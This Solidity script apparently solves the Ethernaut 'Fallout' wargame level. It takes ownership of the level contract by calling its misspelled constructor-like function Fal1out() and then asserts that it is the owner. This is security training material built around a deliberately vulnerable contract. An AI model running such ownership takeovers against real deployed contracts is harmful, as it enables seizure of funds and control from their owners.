// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {EthernautScript} from "src/common/EthernautScript.sol";
import {Fallout} from "./Problem.sol";

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        Fallout instance = Fallout(_instanceAddress);
        instance.Fal1out();
        assert(instance.owner() == tx.origin);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("2");
    }
}
